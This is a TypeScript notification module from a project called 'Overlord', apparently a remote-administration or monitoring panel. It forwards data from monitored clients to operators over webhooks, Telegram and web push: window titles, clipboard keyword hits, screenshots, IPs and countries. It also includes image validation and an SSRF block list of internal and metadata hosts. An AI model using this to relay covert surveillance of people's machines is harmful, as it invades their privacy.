import { v4 as uuidv4 } from "uuid";
import {
  getNotificationScreenshot,
  saveNotificationScreenshot,
  MAX_NOTIFICATION_SCREENSHOT_RECORD_BYTES,
  getAllPushSubscriptions,
  deletePushSubscription,
  type NotificationScreenshotRecord,
  type PushSubscriptionRecord,
} from "../db";
import { logger } from "../logger";
import { sendWebPush } from "./web-push";
import { fetchPublicHttpResponse } from "./url-security";

export type NotificationRecord = {
  id: string;
  clientId: string;
  host?: string;
  user?: string;
  os?: string;
  title: string;
  process?: string;
  processPath?: string;
  detail?: string;
  pid?: number;
  keyword?: string;
  category: "active_window" | "clipboard" | "crash_report";
  ts: number;
  screenshotId?: string;
};

export type PendingNotificationScreenshot = {
  notificationId: string;
  clientId: string;
  ts: number;
  timeout: NodeJS.Timeout;
};

export type UserDeliveryTarget = {
  userId: number;
  username: string;
  webhookEnabled: boolean;
  webhookUrl: string;
  webhookTemplate: string | null;
  telegramEnabled: boolean;
  telegramBotToken: string;
  telegramChatId: string;
  telegramTemplate: string | null;
  clientEventWebhook: boolean;
  clientEventTelegram: boolean;
  clientEventPush: boolean;
};

export const DEFAULT_WEBHOOK_TEMPLATE =
  `{"type":"notification","data":{"title":"{title}","keyword":"{keyword}","clientId":"{clientId}","user":"{user}","host":"{host}","process":"{process}","detail":"{detail}","os":"{os}","pid":"{pid}","ts":"{ts}"}}`;

export const DEFAULT_TELEGRAM_TEMPLATE =
  `\u{1F514} Notification\nTitle: {title}\nKeyword: {keyword}\nClient: {clientId}\nUser: {user}\nHost: {host}\nProcess: {process}\nDetail: {detail}`;

const NOTIFICATION_SCREENSHOT_WAIT_MS = 5_000;
const NOTIFICATION_SCREENSHOT_POLL_MS = 250;
export const MAX_NOTIFICATION_SCREENSHOT_BYTES = MAX_NOTIFICATION_SCREENSHOT_RECORD_BYTES;
export const MAX_NOTIFICATION_SCREENSHOT_DIMENSION = 32_768;
// Keep worst-case browser RGBA decode near 32 MiB per image. Compressed byte
// limits alone do not protect against solid-color PNG/WebP decompression bombs.
export const MAX_NOTIFICATION_SCREENSHOT_PIXELS = 512 * 1024 * 1024;

function boundedPositiveIntegerEnv(name: string, fallback: number, maximum: number): number {
  const parsed = Number(process.env[name]);
  if (!Number.isFinite(parsed) || parsed <= 0) return fallback;
  return Math.min(maximum, Math.max(1, Math.floor(parsed)));
}

export const WEB_PUSH_DELIVERY_CONCURRENCY = boundedPositiveIntegerEnv(
  "OVERLORD_WEB_PUSH_DELIVERY_CONCURRENCY",
  8,
  64,
);
export const WEB_PUSH_DELIVERY_BATCH_SIZE = boundedPositiveIntegerEnv(
  "OVERLORD_WEB_PUSH_DELIVERY_BATCH_SIZE",
  100,
  1_000,
);

/**
 * Settle every task while keeping both the active promise count and each
 * materialized batch bounded. This preserves allSettled-style fan-out without
 * creating one live promise per stored subscription.
 */
export async function settleInBoundedBatches<T>(
  items: readonly T[],
  task: (item: T) => Promise<void>,
  options: {
    concurrency?: number;
    batchSize?: number;
    onError?: (error: unknown, item: T) => void;
  } = {},
): Promise<void> {
  const requestedConcurrency = Number(options.concurrency ?? WEB_PUSH_DELIVERY_CONCURRENCY);
  const requestedBatchSize = Number(options.batchSize ?? WEB_PUSH_DELIVERY_BATCH_SIZE);
  const concurrency = Number.isFinite(requestedConcurrency)
    ? Math.max(1, Math.min(64, Math.floor(requestedConcurrency)))
    : WEB_PUSH_DELIVERY_CONCURRENCY;
  const batchSize = Number.isFinite(requestedBatchSize)
    ? Math.max(1, Math.min(1_000, Math.floor(requestedBatchSize)))
    : WEB_PUSH_DELIVERY_BATCH_SIZE;

  for (let batchStart = 0; batchStart < items.length; batchStart += batchSize) {
    const batch = items.slice(batchStart, batchStart + batchSize);
    let nextIndex = 0;
    const workers = Array.from(
      { length: Math.min(concurrency, batch.length) },
      async () => {
        while (nextIndex < batch.length) {
          const item = batch[nextIndex++];
          try {
            await task(item);
          } catch (error) {
            try {
              options.onError?.(error, item);
            } catch {
              // Delivery remains best-effort even if diagnostic logging fails.
            }
          }
        }
      },
    );
    await Promise.all(workers);
  }
}

export type ValidatedNotificationScreenshot = {
  bytes: Uint8Array;
  format: "jpeg" | "png" | "webp";
  width?: number;
  height?: number;
};

function normalizeScreenshotDimension(value: unknown): number | undefined {
  const parsed = Number(value);
  if (!Number.isSafeInteger(parsed) || parsed <= 0 || parsed > MAX_NOTIFICATION_SCREENSHOT_DIMENSION) {
    return undefined;
  }
  return parsed;
}

function screenshotDimensionsAllowed(width: number, height: number): boolean {
  return Number.isInteger(width)
    && Number.isInteger(height)
    && width > 0
    && height > 0
    && width <= MAX_NOTIFICATION_SCREENSHOT_DIMENSION
    && height <= MAX_NOTIFICATION_SCREENSHOT_DIMENSION
    && width * height <= MAX_NOTIFICATION_SCREENSHOT_PIXELS;
}

function parsePngScreenshot(buf: Buffer): { width: number; height: number } | null {
  if (buf.length < 45 || !buf.subarray(0, 8).equals(Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]))) return null;
  let offset = 8;
  let dimensions: { width: number; height: number } | null = null;
  let sawData = false;
  while (offset + 12 <= buf.length) {
    const length = buf.readUInt32BE(offset);
    const end = offset + 12 + length;
    if (end > buf.length) return null;
    const type = buf.subarray(offset + 4, offset + 8).toString("ascii");
    if (type === "acTL" || type === "fcTL" || type === "fdAT") return null;
    if (offset === 8) {
      if (type !== "IHDR" || length !== 13) return null;
      dimensions = { width: buf.readUInt32BE(offset + 8), height: buf.readUInt32BE(offset + 12) };
    } else if (type === "IDAT") {
      sawData = true;
    } else if (type === "IEND") {
      return length === 0 && end === buf.length && sawData ? dimensions : null;
    }
    offset = end;
  }
  return null;
}

function parseJpegScreenshot(buf: Buffer): { width: number; height: number } | null {
  if (buf.length < 16 || buf[0] !== 0xff || buf[1] !== 0xd8 || buf[buf.length - 2] !== 0xff || buf[buf.length - 1] !== 0xd9) return null;
  let offset = 2;
  while (offset + 4 <= buf.length - 2) {
    if (buf[offset] !== 0xff) return null;
    while (offset < buf.length && buf[offset] === 0xff) offset += 1;
    const marker = buf[offset++];
    if (marker === 0xd8 || marker === 0x01 || (marker >= 0xd0 && marker <= 0xd7)) continue;
    if (offset + 2 > buf.length) return null;
    const length = buf.readUInt16BE(offset);
    if (length < 2 || offset + length > buf.length) return null;
    const isFrame = marker >= 0xc0 && marker <= 0xcf && marker !== 0xc4 && marker !== 0xc8 && marker !== 0xcc;
    if (isFrame) {
      if (length < 8) return null;
      return { width: buf.readUInt16BE(offset + 5), height: buf.readUInt16BE(offset + 3) };
    }
    if (marker === 0xda) return null;
    offset += length;
  }
  return null;
}

function parseWebpScreenshot(buf: Buffer): { width: number; height: number } | null {
  if (buf.length < 20 || buf.subarray(0, 4).toString("ascii") !== "RIFF" || buf.readUInt32LE(4) + 8 !== buf.length || buf.subarray(8, 12).toString("ascii") !== "WEBP") return null;
  let offset = 12;
  let dimensions: { width: number; height: number } | null = null;
  while (offset + 8 <= buf.length) {
    const type = buf.subarray(offset, offset + 4).toString("ascii");
    const length = buf.readUInt32LE(offset + 4);
    const data = offset + 8;
    const end = data + length;
    if (end > buf.length || type === "ANIM" || type === "ANMF") return null;
    if (type === "VP8 " && length >= 10 && buf[data + 3] === 0x9d && buf[data + 4] === 0x01 && buf[data + 5] === 0x2a) {
      dimensions ??= { width: buf.readUInt16LE(data + 6) & 0x3fff, height: buf.readUInt16LE(data + 8) & 0x3fff };
    } else if (type === "VP8L" && length >= 5 && buf[data] === 0x2f) {
      const packed = buf.readUInt32LE(data + 1);
      dimensions ??= { width: (packed & 0x3fff) + 1, height: ((packed >>> 14) & 0x3fff) + 1 };
    } else if (type === "VP8X" && length >= 10) {
      if ((buf[data] & 0x02) !== 0) return null;
      dimensions ??= {
        width: 1 + buf[data + 4] + (buf[data + 5] << 8) + (buf[data + 6] << 16),
        height: 1 + buf[data + 7] + (buf[data + 8] << 8) + (buf[data + 9] << 16),
      };
    }
    offset = end + (length % 2);
  }
  return offset === buf.length ? dimensions : null;
}

export function validateNotificationScreenshotPayload(
  payload: any,
): ValidatedNotificationScreenshot | null {
  let bytes: Uint8Array | null = null;
  if (payload?.data instanceof Uint8Array) {
    bytes = new Uint8Array(
      payload.data.buffer,
      payload.data.byteOffset,
      payload.data.byteLength,
    );
  } else if (payload?.data instanceof ArrayBuffer) {
    bytes = new Uint8Array(payload.data);
  } else if (ArrayBuffer.isView(payload?.data)) {
    bytes = new Uint8Array(
      payload.data.buffer,
      payload.data.byteOffset,
      payload.data.byteLength,
    );
  }

  if (!bytes || bytes.byteLength === 0 || bytes.byteLength > MAX_NOTIFICATION_SCREENSHOT_BYTES) {
    return null;
  }

  const rawFormat = typeof payload?.format === "string" ? payload.format.toLowerCase() : "jpeg";
  const format = rawFormat === "jpg" ? "jpeg" : rawFormat;
  if (format !== "jpeg" && format !== "png" && format !== "webp") {
    return null;
  }

  const buf = Buffer.from(bytes.buffer, bytes.byteOffset, bytes.byteLength);
  const dimensions = format === "png"
    ? parsePngScreenshot(buf)
    : format === "webp"
      ? parseWebpScreenshot(buf)
      : parseJpegScreenshot(buf);
  if (!dimensions || !screenshotDimensionsAllowed(dimensions.width, dimensions.height)) return null;
  const reportedWidth = normalizeScreenshotDimension(payload?.width);
  const reportedHeight = normalizeScreenshotDimension(payload?.height);
  if (
    (payload?.width !== undefined && reportedWidth !== dimensions.width)
    || (payload?.height !== undefined && reportedHeight !== dimensions.height)
  ) return null;

  return {
    bytes,
    format,
    width: dimensions.width,
    height: dimensions.height,
  };
}

export function isPrivateOrInternalHostname(hostname: string): boolean {
  const h = hostname.toLowerCase();
  const BLOCKED_HOSTS = ["localhost", "metadata.google.internal", "169.254.169.254"];
  return (
    BLOCKED_HOSTS.includes(h) ||
    h.endsWith(".internal") ||
    h.startsWith("127.") ||
    h === "[::1]" ||
    /^(10\.|172\.(1[6-9]|2\d|3[01])\.|192\.168\.)/.test(h) ||
    h.startsWith("169.254.") ||
    h.startsWith("0.")
  );
}

function getScreenshotMeta(format: string | undefined): { contentType: string; ext: string } {
  const normalized = (format || "jpeg").toLowerCase();
  if (normalized === "png") return { contentType: "image/png", ext: "png" };
  if (normalized === "webp") return { contentType: "image/webp", ext: "webp" };
  if (normalized === "jpg" || normalized === "jpeg") return { contentType: "image/jpeg", ext: "jpg" };
  return { contentType: "application/octet-stream", ext: "bin" };
}

export function renderNotificationTemplate(
  template: string | null | undefined,
  record: NotificationRecord,
  defaultTemplate: string,
): string {
  const tpl = template && template.trim() ? template : defaultTemplate;
  return tpl
    .replace(/{title}/g, record.title ?? "")
    .replace(/{keyword}/g, record.keyword ?? "")
    .replace(/{clientId}/g, record.clientId ?? "")
    .replace(/{user}/g, record.user ?? "")
    .replace(/{host}/g, record.host ?? "")
    .replace(/{process}/g, record.process ?? "")
    .replace(/{detail}/g, record.detail ?? "")
    .replace(/{os}/g, record.os ?? "")
    .replace(/{pid}/g, String(record.pid ?? ""))
    .replace(/{ts}/g, String(record.ts ?? ""));
}

function buildCanonicalWebhookPayload(record: NotificationRecord): string {
  return JSON.stringify({ type: "notification", data: record });
}

function buildWebhookBody(target: UserDeliveryTarget, record: NotificationRecord): string {
  const customTemplate = target.webhookTemplate?.trim() || "";
  if (!customTemplate) {
    return buildCanonicalWebhookPayload(record);
  }

  const rendered = renderNotificationTemplate(customTemplate, record, DEFAULT_WEBHOOK_TEMPLATE);
  try {
    const parsed = JSON.parse(rendered);
    return JSON.stringify(parsed);
  } catch (err) {
    logger.warn(
      `[notify] invalid webhook template for user ${target.username}; falling back to canonical payload`,
      err,
    );
    return buildCanonicalWebhookPayload(record);
  }
}

async function waitForNotificationScreenshot(
  notificationId: string,
  timeoutMs = NOTIFICATION_SCREENSHOT_WAIT_MS,
): Promise<NotificationScreenshotRecord | null> {
  const start = Date.now();
  while (Date.now() - start < timeoutMs) {
    const screenshot = getNotificationScreenshot(notificationId);
    if (screenshot) return screenshot;
    await new Promise<void>((resolve) => setTimeout(resolve, NOTIFICATION_SCREENSHOT_POLL_MS));
  }
  return null;
}

export function takePendingNotificationScreenshot(
  pendingNotificationScreenshots: Map<string, PendingNotificationScreenshot>,
  clientId: string,
): PendingNotificationScreenshot | null {
  for (const [commandId, pending] of pendingNotificationScreenshots.entries()) {
    if (pending.clientId !== clientId) continue;
    clearTimeout(pending.timeout);
    pendingNotificationScreenshots.delete(commandId);
    return pending;
  }
  return null;
}

export function storeNotificationScreenshot(
  pending: PendingNotificationScreenshot,
  bytes: Uint8Array,
  format: string,
  width?: number,
  height?: number,
): void {
  const validated = validateNotificationScreenshotPayload({ data: bytes, format, width, height });
  if (!validated) return;
  const screenshotId = uuidv4();

  const saved = saveNotificationScreenshot({
    id: screenshotId,
    notificationId: pending.notificationId,
    clientId: pending.clientId,
    ts: pending.ts,
    format: validated.format,
    width: validated.width,
    height: validated.height,
    bytes: validated.bytes,
  });
  if (!saved) {
    logger.warn(
      `[notify] screenshot was not stored due to a missing notification, duplicate result, or storage quota notification=${pending.notificationId}`,
    );
  }
}

async function deliverToUserWebhook(
  target: UserDeliveryTarget,
  record: NotificationRecord,
  screenshot?: NotificationScreenshotRecord | null,
): Promise<void> {
  if (!target.webhookEnabled) return;
  const url = (target.webhookUrl || "").trim();
  if (!url) return;

  let parsed: URL;
  try {
    parsed = new URL(url);
    if (!/^https?:$/.test(parsed.protocol)) return;
  } catch {
    return;
  }

  try {
    const isDiscord = /discord(app)?\.com$/i.test(parsed.hostname);
    if (isDiscord) {
      const embed: Record<string, any> = {
        title: record.keyword ? `Keyword: ${record.keyword}` : "Active Window",
        description: record.title,
        fields: [
          { name: "Client", value: record.clientId || "unknown", inline: true },
          { name: "User", value: record.user || "unknown", inline: true },
          { name: "Host", value: record.host || "unknown", inline: true },
          { name: "Process", value: record.process || "unknown", inline: true },
        ],
        timestamp: new Date(record.ts).toISOString(),
      };

      const payload: Record<string, any> = {
        content: `\u{1F514} Notification: ${record.title}`,
        embeds: [embed],
      };

      if (screenshot?.bytes?.length) {
        const meta = getScreenshotMeta(screenshot.format);
        const filename = `notification-${record.id}.${meta.ext}`;
        embed.image = { url: `attachment://${filename}` };
        const form = new FormData();
        form.append("payload_json", JSON.stringify(payload));
        form.append(
          "files[0]",
          new Blob([screenshot.bytes as any], { type: meta.contentType }),
          filename,
        );
        await fetchPublicHttpResponse(url, { method: "POST", body: form });
        return;
      }

      await fetchPublicHttpResponse(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload),
      });
      return;
    }

    const body = buildWebhookBody(target, record);
    await fetchPublicHttpResponse(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body,
    });
  } catch (err) {
    logger.warn(`[notify] webhook delivery to user ${target.username} failed`, err);
  }
}

const TELEGRAM_MESSAGE_MAX = 4096;
const TELEGRAM_CAPTION_MAX = 1024;

function truncateText(text: string, max: number): string {
  if (text.length <= max) return text;
  return text.slice(0, max - 1) + "…";
}

async function consumeTelegramResponse(res: Response, context: string): Promise<void> {
  try {
    const body = await res.text();
    if (!res.ok) {
      logger.warn(`[notify] ${context}: telegram API ${res.status} — ${body.slice(0, 300)}`);
    }
  } catch { }
}

async function deliverToUserTelegram(
  target: UserDeliveryTarget,
  record: NotificationRecord,
  screenshot?: NotificationScreenshotRecord | null,
): Promise<void> {
  if (!target.telegramEnabled) return;
  const token = (target.telegramBotToken || "").trim();
  const chatId = (target.telegramChatId || "").trim();
  if (!token || !chatId) return;

  const text = renderNotificationTemplate(target.telegramTemplate, record, DEFAULT_TELEGRAM_TEMPLATE);

  try {
    if (screenshot?.bytes?.length) {
      const meta = getScreenshotMeta(screenshot.format);
      const filename = `notification-${record.id}.${meta.ext}`;
      const form = new FormData();
      form.append("chat_id", chatId);
      form.append("caption", truncateText(text, TELEGRAM_CAPTION_MAX));
      form.append("photo", new Blob([screenshot.bytes as any], { type: meta.contentType }), filename);
      const apiUrl = `https://api.telegram.org/bot${token}/sendPhoto`;
      const res = await fetch(apiUrl, { method: "POST", body: form });
      await consumeTelegramResponse(res, `notification photo to ${target.username}`);
      return;
    }

    const apiUrl = `https://api.telegram.org/bot${token}/sendMessage`;
    const res = await fetch(apiUrl, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: chatId, text: truncateText(text, TELEGRAM_MESSAGE_MAX) }),
    });
    await consumeTelegramResponse(res, `notification to ${target.username}`);
  } catch (err) {
    logger.warn(`[notify] telegram delivery to user ${target.username} (chat ${chatId}) failed`, err);
  }
}

async function deliverToUser(
  target: UserDeliveryTarget,
  record: NotificationRecord,
  screenshot?: NotificationScreenshotRecord | null,
): Promise<void> {
  await Promise.allSettled([
    deliverToUserWebhook(target, record, screenshot),
    deliverToUserTelegram(target, record, screenshot),
  ]);
}

async function deliverWebPushToAll(
  record: NotificationRecord,
  getUserDeliveryTargets: (clientId: string) => UserDeliveryTarget[],
): Promise<void> {
  const subs = getAllPushSubscriptions();
  if (subs.length === 0) return;

  const targets = getUserDeliveryTargets(record.clientId);
  const allowedUserIds = new Set(targets.map((t) => t.userId));

  const title = record.category === "crash_report"
    ? "Overlord \u2014 Crash Report"
    : record.keyword
    ? `Overlord \u2014 ${record.keyword}`
    : "Overlord \u2014 Notification";
  const lines = [record.title];
  if (record.user) lines.push(`User: ${record.user}`);
  if (record.host) lines.push(`Host: ${record.host}`);
  if (record.process) lines.push(`Process: ${record.process}`);
  if (record.detail) lines.push(String(record.detail).slice(0, 300));

  const payload = JSON.stringify({
    type: "notification",
    title,
    body: lines.filter(Boolean).join("\n"),
    tag: `overlord-${record.id || Date.now()}`,
    url: "/notifications",
  });

  const eligibleSubscriptions = subs.filter((sub) => allowedUserIds.has(sub.userId));
  await settleInBoundedBatches(
    eligibleSubscriptions,
    async (sub) => {
      const result = await sendWebPush(
        { endpoint: sub.endpoint, keys: { p256dh: sub.p256dh, auth: sub.auth } },
        payload,
      );
      if (result.gone) {
        deletePushSubscription(sub.endpoint);
        logger.info(`[web-push] removed gone subscription for user ${sub.userId}`);
      } else if (!result.success) {
        logger.warn(`[web-push] delivery failed for user ${sub.userId}: ${result.error}`);
      }
    },
    {
      onError: (error, sub) => {
        logger.warn(`[web-push] delivery threw for user ${sub.userId}`, error);
      },
    },
  );
}

export async function deliverWebPushClientEvent(
  event: string,
  info: { id: string; host?: string; user?: string; os?: string },
  canUserAccessClient: (userId: number, userRole: string, clientId: string) => boolean,
  getUserRole: (userId: number) => string | undefined,
  isClientEventPushEnabled?: (userId: number) => boolean,
  isClientOwnedByUser?: (userId: number, clientId: string) => boolean,
): Promise<void> {
  const subs = getAllPushSubscriptions();
  if (subs.length === 0) return;

  const labels: Record<string, string> = {
    client_online: "\u{1F7E2} Client Online",
    client_offline: "\u{1F534} Client Offline",
    client_purgatory: "\u{1F7E1} Client Awaiting Approval",
  };

  const title = labels[event] || "Overlord \u2014 Client Event";
  const lines: string[] = [];
  if (info.host) lines.push(`Host: ${info.host}`);
  if (info.user) lines.push(`User: ${info.user}`);
  if (info.os) lines.push(`OS: ${info.os}`);
  if (info.id) lines.push(`ID: ${info.id}`);

  const dest = event === "client_purgatory" ? "/purgatory" : "/";

  const payload = JSON.stringify({
    type: "client_event",
    event,
    title,
    body: lines.join("\n") || info.id || "",
    tag: `overlord-client-${event}-${info.id || Date.now()}`,
    url: dest,
  });

  await settleInBoundedBatches(
    subs,
    async (sub) => {
      const role = getUserRole(sub.userId);
      if (!role) return;
      if (isClientEventPushEnabled && !isClientEventPushEnabled(sub.userId)) return;
      if (event === "client_purgatory") {
        if (role === "admin") {
        } else if (role === "operator") {
          if (!isClientOwnedByUser || !isClientOwnedByUser(sub.userId, info.id)) {
            return;
          }
        } else {
          return;
        }
      } else if (role !== "admin") {
        if (!canUserAccessClient(sub.userId, role, info.id)) return;
      }

      const result = await sendWebPush(
        { endpoint: sub.endpoint, keys: { p256dh: sub.p256dh, auth: sub.auth } },
        payload,
      );
      if (result.gone) {
        deletePushSubscription(sub.endpoint);
      }
    },
    {
      onError: (error, sub) => {
        logger.warn(`[web-push] client-event delivery threw for user ${sub.userId}`, error);
      },
    },
  );
}

export async function deliverNotificationWithScreenshot(
  record: NotificationRecord,
  getUserDeliveryTargets: (clientId: string) => UserDeliveryTarget[],
): Promise<void> {
  const screenshot = await waitForNotificationScreenshot(record.id);
  const targets = getUserDeliveryTargets(record.clientId);
  await Promise.allSettled([
    settleInBoundedBatches(
      targets,
      async (target) => deliverToUser(target, record, screenshot),
      {
        onError: (error, target) => {
          logger.warn(`[notify] delivery threw for user ${target.username}`, error);
        },
      },
    ),
    deliverWebPushToAll(record, getUserDeliveryTargets),
  ]);
}

export type ClientEventInfo = {
  id: string;
  host?: string;
  user?: string;
  os?: string;
  ip?: string;
  country?: string;
};

const CLIENT_EVENT_LABELS: Record<string, string> = {
  client_online: "\u{1F7E2} Client Online",
  client_offline: "\u{1F534} Client Offline",
  client_purgatory: "\u{1F7E1} Client Awaiting Approval",
};

const CLIENT_EVENT_COLORS: Record<string, number> = {
  client_online: 0x22c55e,
  client_offline: 0xef4444,
  client_purgatory: 0xeab308,
};

export async function deliverClientEventToExternalChannels(
  event: string,
  info: ClientEventInfo,
  targets: UserDeliveryTarget[],
): Promise<void> {
  if (targets.length === 0) return;

  const label = CLIENT_EVENT_LABELS[event] || "Client Event";
  const ts = Date.now();

  await settleInBoundedBatches(
    targets,
    async (target) => {
      if (target.webhookEnabled && target.clientEventWebhook && target.webhookUrl) {
        const url = target.webhookUrl.trim();
        if (!url) return;
        let parsed: URL;
        try {
          parsed = new URL(url);
          if (!/^https?:$/.test(parsed.protocol)) return;
        } catch {
          return;
        }
        try {
          const isDiscord = /discord(app)?\.com$/i.test(parsed.hostname);
          if (isDiscord) {
            const fields = [
              { name: "Client", value: info.id || "unknown", inline: true },
              { name: "User", value: info.user || "unknown", inline: true },
              { name: "Host", value: info.host || "unknown", inline: true },
              { name: "OS", value: info.os || "unknown", inline: true },
            ];
            if (info.ip) fields.push({ name: "IP", value: info.ip, inline: true });
            if (info.country) fields.push({ name: "Country", value: info.country, inline: true });

            const embed: Record<string, any> = {
              title: label,
              color: CLIENT_EVENT_COLORS[event] ?? 0x94a3b8,
              fields,
              timestamp: new Date(ts).toISOString(),
            };
            const payload = { content: label, embeds: [embed] };
            await fetchPublicHttpResponse(url, {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify(payload),
            });
          } else {
            await fetchPublicHttpResponse(url, {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({
                type: "client_event",
                event,
                clientId: info.id,
                user: info.user,
                host: info.host,
                os: info.os,
                ip: info.ip,
                country: info.country,
                ts,
              }),
            });
          }
        } catch (err) {
          logger.warn(`[notify] client event webhook delivery to user ${target.username} failed`, err);
        }
      }

      if (target.telegramEnabled && target.clientEventTelegram && target.telegramBotToken && target.telegramChatId) {
        const token = target.telegramBotToken.trim();
        const chatId = target.telegramChatId.trim();
        if (token && chatId) {
          const lines = [label];
          if (info.id) lines.push(`Client: ${info.id}`);
          if (info.user) lines.push(`User: ${info.user}`);
          if (info.host) lines.push(`Host: ${info.host}`);
          if (info.os) lines.push(`OS: ${info.os}`);
          if (info.ip) lines.push(`IP: ${info.ip}`);
          if (info.country) lines.push(`Country: ${info.country}`);

          try {
            const apiUrl = `https://api.telegram.org/bot${token}/sendMessage`;
            const res = await fetch(apiUrl, {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({ chat_id: chatId, text: truncateText(lines.join("\n"), TELEGRAM_MESSAGE_MAX) }),
            });
            await consumeTelegramResponse(res, `client event to ${target.username}`);
          } catch (err) {
            logger.warn(`[notify] client event telegram delivery to user ${target.username} failed`, err);
          }
        }
      }
    },
    {
      onError: (error, target) => {
        logger.warn(`[notify] client event delivery threw for user ${target.username}`, error);
      },
    },
  );
}

